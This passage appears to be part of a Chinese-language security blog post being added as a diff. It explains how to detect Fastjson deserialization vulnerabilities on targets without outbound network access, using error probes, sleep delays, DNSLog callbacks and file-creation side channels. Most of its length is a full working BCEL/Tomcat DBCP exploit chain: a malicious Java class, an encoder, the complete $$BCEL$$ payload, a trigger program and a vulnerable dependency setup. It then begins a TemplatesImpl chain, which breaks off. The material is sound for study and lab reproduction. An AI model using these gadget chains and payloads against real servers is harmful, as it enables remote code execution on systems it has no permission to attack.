+<li><p><strong>步骤</strong>： 发送一个精心构造的、会引发错误的Payload。 检查HTTP响应状态码是否为 <code>500 Internal Server Error</code>。 仔细分析响应体（Body），搜索常见的Java异常关键字，如 <code>ClassNotFoundException</code>, <code>NullPointerException</code>, <code>getter</code>方法名等。</p>
+</li>
+<li><p><strong>Payload示例</strong>:</p>
+<ul>
+<li><p><strong>触发 <code>ClassNotFoundException</code></strong>： 尝试加载一个肯定不存在的类。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.this.ClassDoesNotExist&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>判断</strong>： 如果返回500错误，且错误信息中包含 <code>ClassNotFoundException</code>和 <code>java.this.ClassDoesNotExist</code>，说明Fastjson确实尝试去加载这个类，漏洞可能存在。</li>
+</ul>
+</li>
+<li><p><strong>利用不存在的属性</strong>： 指定一个存在的类，但设置一个它不存在的属性。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;@type&quot;:&quot;java.net.URL&quot;, &quot;notARealProperty&quot;:&quot;test&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong>判断</strong>： Fastjson会尝试调用 <code>setNotARealProperty</code>方法，但该方法不存在，可能抛出异常。观察错误信息中是否包含 <code>setter</code>字样。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>优点</strong>： 简单快速，无需等待。</p>
+</li>
+<li><p><strong>缺点</strong>： 依赖于应用程序是否开启<strong>调试模式</strong>（即是否将详细错误信息返回给用户）。在生产环境中，错误信息可能被全局异常处理器捕获，只返回一个模糊的错误页面，导致无法判断。 需要人工分析错误内容。</p>
+</li>
+</ul>
+<hr>
+<h3 id="三：利用本地文件读取（如果可能）"><a href="#三：利用本地文件读取（如果可能）" class="headerlink" title="三：利用本地文件读取（如果可能）"></a>三：利用本地文件读取（如果可能）</h3><ul>
+<li><strong>原理</strong>： 如果目标服务器上存在一个你知道内容的文件（例如，Web应用的静态文件 <code>robots.txt</code>），可以尝试构造Payload去读取这个文件，并将内容回显到HTTP响应中。</li>
+<li><strong>步骤</strong>： 构造一个能执行文件读取操作（如 <code>java.io.FileInputStream</code>）的Payload。 让读取的内容（文件内容）以某种方式影响到HTTP响应，例如，将其赋值给某个最终会出现在响应报文中的变量。</li>
+<li><strong>优点</strong>： 一旦成功，证据确凿，不仅能证明漏洞存在，还能直接获取敏感信息。</li>
+<li><strong>缺点</strong>： <strong>实现难度极高</strong>： 在不出网且无法执行任意命令的情况下，很难将文件内容完美地回显到HTTP响应中。这需要一条非常特殊的利用链。 通常不作为首选的探测方法，而是作为漏洞验证成功后的利用手段。</li>
+</ul>
+<hr>
+<h3 id="四：利用资源创建或修改（侧信道攻击）"><a href="#四：利用资源创建或修改（侧信道攻击）" class="headerlink" title="四：利用资源创建或修改（侧信道攻击）"></a>四：利用资源创建或修改（侧信道攻击）</h3><p>这是一种更隐蔽、更高级的方法，需要你对服务器有部分了解。</p>
+<ul>
+<li><strong>原理</strong>： 构造Payload，让服务器执行一个会留下“痕迹”的操作，但这个操作不依赖网络。</li>
+<li><strong>示例</strong>： <strong>创建文件</strong>： 尝试在Web目录（如 <code>/tmp/test.txt</code>）下创建一个文件。然后，尝试通过Web直接访问这个文件 <code>http://target.com/tmp/test.txt</code>。如果能访问到，则证明代码被执行了。 <strong>创建Java进程</strong>： 执行命令启动一个耗时较长的Java进程（如 <code>ping -c 10 127.0.0.1</code>在Linux下）。然后通过系统命令（如果你有其它途径）或监控发现进程是否存在。</li>
+<li><strong>优点</strong>： 非常隐蔽，难以被传统的WAF检测。</li>
+<li><strong>缺点</strong>： 非常依赖于环境，需要精确的路径和权限。 需要一种方式去验证“痕迹”是否产生，这本身可能就需要其他漏洞配合。</li>
+</ul>
+<h3 id="实际操作建议与流程"><a href="#实际操作建议与流程" class="headerlink" title="实际操作建议与流程"></a>实际操作建议与流程</h3><p>在实际渗透中，建议按以下流程进行：</p>
+<ol>
+<li><strong>初步探测（低风险）</strong>： 先使用<strong>报错Payload</strong>（方法二）。快速发送几个请求，看看是否会返回详细的Java错误信息。如果应用返回了详细错误，这是最好的初步指标。</li>
+<li><strong>确认测试（中等风险）</strong>： 如果初步探测有积极迹象，使用<strong>延迟Payload</strong>（方法一）。发送一个睡眠5秒的Payload。如果响应时间明显延迟，基本可以确定漏洞存在。</li>
+<li><strong>工具辅助</strong>： 使用像 <code>fastjson_tool</code>这样的工具，它通常集成了各种版本的Payload（包括不出网的延迟检测Payload），可以自动化这个过程。</li>
+<li><strong>保持谨慎</strong>： 每次测试后，给服务器留出恢复时间，避免高频请求导致服务不可用（DoS）。 优先在测试环境或获得明确授权的目标上进行演练。</li>
+</ol>
+<h3 id="方法总结"><a href="#方法总结" class="headerlink" title="方法总结"></a>方法总结</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>原理</th>
+<th>可观察现象</th>
+<th>可靠性</th>
+<th>隐蔽性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>延迟检测</strong></td>
+<td>触发 <code>Thread.sleep()</code></td>
+<td>HTTP响应时间显著延长</td>
+<td><strong>极高</strong></td>
+<td>低（易被监控发现）</td>
+</tr>
+<tr>
+<td><strong>报错信息</strong></td>
+<td>触发Java异常</td>
+<td>HTTP状态码500，响应体含异常信息</td>
+<td>中（依赖错误回显）</td>
+<td>中</td>
+</tr>
+<tr>
+<td><strong>文件操作</strong></td>
+<td>创建&#x2F;修改&#x2F;读取文件</td>
+<td>通过Web访问或其它方式验证文件变化</td>
+<td>高（但难实现）</td>
+<td>高</td>
+</tr>
+<tr>
+<td><strong>侧信道</strong></td>
+<td>创建进程、网络连接等</td>
+<td>通过系统监控发现变化</td>
+<td>高（但难验证）</td>
+<td><strong>极高</strong></td>
+</tr>
+</tbody></table>
+<p>对于不出网的目标，<strong>“延迟检测”是最可靠、最常用的判断手段</strong>。</p>
+<h2 id="出网（不出网）有漏洞（无漏洞）总结"><a href="#出网（不出网）有漏洞（无漏洞）总结" class="headerlink" title="出网（不出网）有漏洞（无漏洞）总结"></a>出网（不出网）有漏洞（无漏洞）总结</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[开始测试] --&gt; B[Step 1: 发送无害探测Payload&lt;br&gt;（如 java.lang.String）]</span><br><span class="line">    B --&gt; C&#123;观察响应&#125;</span><br><span class="line">    C -- 返回正常响应&lt;br&gt;或包含特定错误信息 --&gt; D[✅ 初步判断: 存在漏洞特征]</span><br><span class="line">    C -- 返回完全无关错误&lt;br&gt;或无视@type --&gt; E[❌ 判断: 无漏洞&lt;br&gt;或版本极新/有防护]</span><br><span class="line">    D --&gt; F[Step 2: 发送出网利用Payload&lt;br&gt;（如 DNSLog 请求）]</span><br><span class="line">    F --&gt; G&#123;检查DNSLog平台&#125;</span><br><span class="line">    G -- 有记录 --&gt; H[🎯 情况一: 有漏洞且出网]</span><br><span class="line">    G -- 无记录 --&gt; I[Step 3: 发送不出网利用Payload&lt;br&gt;（如 Sleep 延迟）]</span><br><span class="line">    I --&gt; J&#123;观察响应延迟&#125;</span><br><span class="line">    J -- 有明显延迟 --&gt; K[🎯 情况三: 有漏洞但不出网]</span><br><span class="line">    J -- 无延迟 --&gt; L[Step 4: 发送无效出网Payload&lt;br&gt;（如错误地址）进行最终确认]</span><br><span class="line">    L --&gt; M&#123;观察响应&#125;</span><br><span class="line">    M -- 返回与Step 2相同的&lt;br&gt;JNDI错误信息 --&gt; N[🎯 情况三: 有漏洞但不出网&lt;br&gt;（网络限制导致Step 2失败）]</span><br><span class="line">    M -- 返回不同错误&lt;br&gt;或快速失败 --&gt; O[🎯 情况二: 无漏洞&lt;br&gt;（版本安全或有WAF拦截）]</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<table>
+<thead>
+<tr>
+<th align="left">情况</th>
+<th align="left">描述</th>
+<th align="left">Step 1 无害探测</th>
+<th align="left">Step 2 出网利用 (DNSLog)</th>
+<th align="left">Step 3 不出网利用 (Sleep)</th>
+<th align="left">最终判断</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>情况一</strong></td>
+<td align="left"><strong>有漏洞，且出网</strong></td>
+<td align="left">有漏洞特征（如500错误）</td>
+<td align="left"><strong>有DNS记录</strong></td>
+<td align="left">(无需测试)</td>
+<td align="left"><strong>有漏洞，可直接利用</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>情况二</strong></td>
+<td align="left"><strong>无漏洞</strong></td>
+<td align="left">无漏洞特征（如200成功）</td>
+<td align="left">无DNS记录</td>
+<td align="left">无延迟</td>
+<td align="left">版本安全或有防护</td>
+</tr>
+<tr>
+<td align="left"><strong>情况三</strong></td>
+<td align="left"><strong>有漏洞，但不出网</strong></td>
+<td align="left">有漏洞特征（如500错误）</td>
+<td align="left">无DNS记录</td>
+<td align="left"><strong>有显著延迟</strong></td>
+<td align="left"><strong>有漏洞，需用不出网方法</strong></td>
+</tr>
+<tr>
+<td align="left"><strong>情况四</strong></td>
+<td align="left"><strong>无漏洞</strong></td>
+<td align="left">无漏洞特征（如200成功）</td>
+<td align="left">无DNS记录</td>
+<td align="left">无延迟</td>
+<td align="left">版本安全或有防护</td>
+</tr>
+</tbody></table>
+<h2 id="利用（有漏洞不出王的情况）"><a href="#利用（有漏洞不出王的情况）" class="headerlink" title="利用（有漏洞不出王的情况）"></a>利用（有漏洞不出王的情况）</h2><h3 id="BCEL-Tomcat-Spring链"><a href="#BCEL-Tomcat-Spring链" class="headerlink" title="BCEL-Tomcat&amp;Spring链"></a>BCEL-Tomcat&amp;Spring链</h3><blockquote>
+<p>利用Java的BCEL字节码进行绕过，字节码，就是Java源代码编译后的产物，它是一种中间代码，既不是完全的机器语言，也不是咱们写的那些高级语言代码。JVM（Java虚拟机）就是通过解释或编译这些字节码来运行咱们的程序。而BCEL字节码检测器是一个Java字节码操作库,可以用于分析、修改和创建Java类文件的字节码.</p>
+</blockquote>
+<h4 id="gadget链：poc"><a href="#gadget链：poc" class="headerlink" title="gadget链：poc"></a>gadget链：poc</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;driverClassLoader&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;driverClassName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$$BCEL$$xxxx&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="条件："><a href="#条件：" class="headerlink" title="条件："></a>条件：</h4><table>
+<thead>
+<tr>
+<th align="left">必要条件</th>
+<th align="left">具体说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>Fastjson版本</strong></td>
+<td align="left">存在反序列化漏洞的版本，通常 ≤ 1.2.24</td>
+</tr>
+<tr>
+<td align="left"><strong>JDK版本</strong></td>
+<td align="left">通常建议 ≤ JDK 8u251。高版本JDK（如8u251+）中<code>com.sun.org.apache.bcel.internal.util.ClassLoader</code>被限制或移除</td>
+</tr>
+<tr>
+<td align="left"><strong>依赖组件</strong></td>
+<td align="left">1. <strong>Tomcat DBCP</strong>：需要<code>tomcat-dbcp.jar</code>（Tomcat 8.0+ 使用<code>org.apache.tomcat.dbcp.dbcp2.BasicDataSource</code>，Tomcat 8.0- 使用<code>org.apache.tomcat.dbcp.dbcp.BasicDataSource</code>） 2. <strong>BCEL支持</strong>：需要BCEL库（<code>bcel.jar</code>），或JDK内嵌的BCEL组件（JDK8及以下）</td>
+</tr>
+<tr>
+<td align="left"><strong>恶意类构造</strong></td>
+<td align="left">需提前编译好恶意Java类（如<code>Evil.class</code>），该类静态代码块或构造函数中包含恶意代码</td>
+</tr>
+<tr>
+<td align="left"><strong>BCEL编码</strong></td>
+<td align="left">需将恶意<code>.class</code>文件的字节码使用BCEL格式编码，生成以<code>$$BCEL$$</code>开头的长字符串</td>
+</tr>
+<tr>
+<td align="left"><strong>AutoType功能</strong></td>
+<td align="left">Fastjson的AutoType功能需要开启（这是触发<code>@type</code>解析的前提）</td>
+</tr>
+</tbody></table>
+<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><h5 id="一、制作恶意类"><a href="#一、制作恶意类" class="headerlink" title="一、制作恶意类"></a>一、制作恶意类</h5><p>准备执行的恶意类</p>
+<p>Poc.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.nonetwork.FastjsonDemo.two;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Poc</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Poc</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>javac Poc.java</code>编译成<code>Poc.class</code>文件。</p>
+<p><img src="/./images/image-20250926183917771.png" alt="image-20250926183917771"></p>
+<h5 id="生成BCEL字符串"><a href="#生成BCEL字符串" class="headerlink" title="生成BCEL字符串"></a>生成BCEL字符串</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.nonetwork.FastjsonDemo.two;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.bcel.internal.classfile.Utility;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span>  <span class="keyword">class</span> <span class="title class_">Bcel</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Path</span> <span class="variable">path</span> <span class="operator">=</span> Paths.get(<span class="string">&quot;Poc.class的路径&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(path);</span><br><span class="line">        System.out.println(bytes.length);</span><br><span class="line">        <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> Utility.encode(bytes,<span class="literal">true</span>);</span><br><span class="line">        <span class="type">BufferedWriter</span> <span class="variable">bw</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;res.txt&quot;</span>));</span><br><span class="line">        bw.write(<span class="string">&quot;$$BCEL$$&quot;</span> + result);</span><br><span class="line">        bw.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成一个res.txt文件，内容如下</p>
+<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQMO$C1$Q$7d$85$95$c5u$91$F$E$bfM$3c$J$i$dc$8b7$8c$X$95$T$w$R$a3$5eKm$c8$c2nKv$8b$f2$8f$3c$7bQ$e3$c1$l$e0$8fRg9$I$89$9dd$day$f3$e6$cd$b4$fd$fa$fe$f8$Ep$84$3d$H6J$O$ca$a8$e4$b1$96$eeU$h5$h$eb66$Yr$c7$81$K$cc$JC$b6$de$b8e$b0N$f5$83d$uv$C$r$_$tQ_$c67$bc$l$SR$e8$Z$$F$X$7c$3c$8bg$d55$G$a7$a7$t$b1$90$ed$m$a5$e4$bbZ$i$O$f9$pw$91$c7$b2$8dM$X$5b$d8$sM$c1C$e1b$H$bb$M$954$ef$87$5c$N$fc$f3$a9$90c$Th$c5$d0$U$3a$f2$e5$94G$e3P$faJ$xi$9et$3c$f2$db$3c1$c3D$ab3$Zi$9f$m$9f$g0xs$89$ab$feP$K$c3P$9aC$d7$Te$82$88$a6q$G$d2$fc$F$d5z$a3$f3$8f$d3$a2$d1$e4T$92$e4A$7d$n$db3q$a0$G$ad$c5$82n$ac$85L$92$W$f6$91$a3$c7L$X$p$a3$5b$92w$u$baG$86$M$u7$df$c0$de$91$vg_a$dd$3d$c3$ea$bc$Q$c3B$B$k$96$88$b1B$9c$g$9d$40$98EZ$F$d2$f0$d2$ef$n$r$97P$P$99$lr$cc$a6$M$b9$d5$b4O$91$f0$M$bc_$c5$a8$ca$87$d0$B$A$A</span><br></pre></td></tr></table></figure>
+
+<h5 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h5><p>利用链的poc构造代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.nonetwork.FastjsonDemo.two;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="comment">//        org.apache.tomcat.dbcp.dbcp2.BasicDataSource</span></span><br><span class="line">        String poc=<span class="string">&quot;&#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;   \&quot;@type\&quot;: \&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource\&quot;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;   \&quot;driverClassLoader\&quot;: &#123;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        \&quot;@type\&quot;: \&quot;com.sun.org.apache.bcel.internal.util.ClassLoader\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;   &#125;,\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;   \&quot;driverClassName\&quot;: \&quot;$$BCEL$$$l$8b$I$A$A$A$A$A$A$AeQMO$C1$Q$7d$85$95$c5u$91$F$E$bfM$3c$J$i$dc$8b7$8c$X$95$T$w$R$a3$5eKm$c8$c2nKv$8b$f2$8f$3c$7bQ$e3$c1$l$e0$8fRg9$I$89$9dd$day$f3$e6$cd$b4$fd$fa$fe$f8$Ep$84$3d$H6J$O$ca$a8$e4$b1$96$eeU$h5$h$eb66$Yr$c7$81$K$cc$JC$b6$de$b8e$b0N$f5$83d$uv$C$r$_$tQ_$c67$bc$l$SR$e8$Z$$F$X$7c$3c$8bg$d55$G$a7$a7$t$b1$90$ed$m$a5$e4$bbZ$i$O$f9$pw$91$c7$b2$8dM$X$5b$d8$sM$c1C$e1b$H$bb$M$954$ef$87$5c$N$fc$f3$a9$90c$Th$c5$d0$U$3a$f2$e5$94G$e3P$faJ$xi$9et$3c$f2$db$3c1$c3D$ab3$Zi$9f$m$9f$g0xs$89$ab$feP$K$c3P$9aC$d7$Te$82$88$a6q$G$d2$fc$F$d5z$a3$f3$8f$d3$a2$d1$e4T$92$e4A$7d$n$db3q$a0$G$ad$c5$82n$ac$85L$92$W$f6$91$a3$c7L$X$p$a3$5b$92w$u$baG$86$M$u7$df$c0$de$91$vg_a$dd$3d$c3$ea$bc$Q$c3B$B$k$96$88$b1B$9c$g$9d$40$98EZ$F$d2$f0$d2$ef$n$r$97P$P$99$lr$cc$a6$M$b9$d5$b4O$91$f0$M$bc_$c5$a8$ca$87$d0$B$A$A\&quot;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;\n&quot;</span>;</span><br><span class="line">        JSON.parseObject(poc);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>运行这个代码就可以触发弹出计算器</p>
+<p>parse()和parseObject()两种方法的区别及导致不同结果的关键原因：</p>
+<table>
+<thead>
+<tr>
+<th align="left">方法</th>
+<th align="left">执行流程</th>
+<th align="left">是否触发漏洞</th>
+<th align="left">关键原因</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong><code>parseObject(poc)</code></strong></td>
+<td align="left">1. 解析JSON，实例化<code>BasicDataSource</code>并设置属性（<code>driverClassLoader</code>和<code>driverClassName</code>） 2. <strong>额外执行 <code>JSON.toJSON(obj)</code></strong>，尝试将对象转换为<code>JSONObject</code> 3. 在转换过程中，<strong>调用目标对象的Getter方法</strong>（如<code>getConnection</code>） 4. <code>BasicDataSource</code>初始化，触发<code>Class.forName()</code>加载”驱动” 5. BCEL ClassLoader解码<code>$$BCEL$$</code>字符串，加载并初始化恶意类</td>
+<td align="left">✅ 成功</td>
+<td align="left"><strong>额外的 <code>toJSON</code>操作触发了Getter方法，驱动了<code>BasicDataSource</code>的完整初始化流程</strong>，使得BCEL字节码被加载执行。</td>
+</tr>
+<tr>
+<td align="left"><strong><code>parse(poc)</code></strong></td>
+<td align="left">1. 解析JSON，实例化<code>BasicDataSource</code>并设置属性（<code>driverClassLoader</code>和<code>driverClassName</code>） 2. <strong>过程结束</strong>，仅完成反序列化，未触发后续初始化</td>
+<td align="left">❌ 失败</td>
+<td align="left"><strong>缺少触发点</strong>。仅设置了属性，但未调用任何会引发<code>BasicDataSource</code>真正去加载驱动类的Getter或特定方法，利用链停滞。</td>
+</tr>
+</tbody></table>
+<p>（我的复现在IDEA创建的Spring项目，jdk使用jdk8u,fastjson1.2.24,记得添加bcel，tomcat-dbcp等依赖）</p>
+<p>pom.xml内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-dbcp<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.5.31<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.bcel<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>bcel<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="TemplatesImpl链"><a href="#TemplatesImpl链" class="headerlink" title="TemplatesImpl链"></a>TemplatesImpl链</h3><h4 id="一、TemplatesImpl-链核心原理"><a href="#一、TemplatesImpl-链核心原理" class="headerlink" title="一、TemplatesImpl 链核心原理"></a><strong>一、TemplatesImpl 链核心原理</strong></h4><p>TemplatesImpl 链的核心在于，攻击者通过 Fastjson 反序列化操作，控制 <code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code>类的属性，使其加载并执行恶意字节码。(这个类是jdk8版本自带的类，所以不需要任何依赖)</p>
+<p>整个攻击流程的调用链可以清晰地展示如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[Fastjson 反序列化] --&gt; B[设置 TemplatesImpl 属性]</span><br><span class="line">    B --&gt; C[自动调用 getOutputProperties]</span><br><span class="line">    C --&gt; D[调用 newTransformer]</span><br><span class="line">    D --&gt; E[调用 getTransletInstance]</span><br><span class="line">    E --&gt; F&#123;检查 _name 不为空&lt;br&gt;且 _class 为空&#125;</span><br><span class="line">    F --&gt;|是| G[调用 defineTransletClasses]</span><br><span class="line">    G --&gt; H&#123;检查 _bytecodes 不为空&#125;</span><br><span class="line">    H --&gt;|是| I[使用 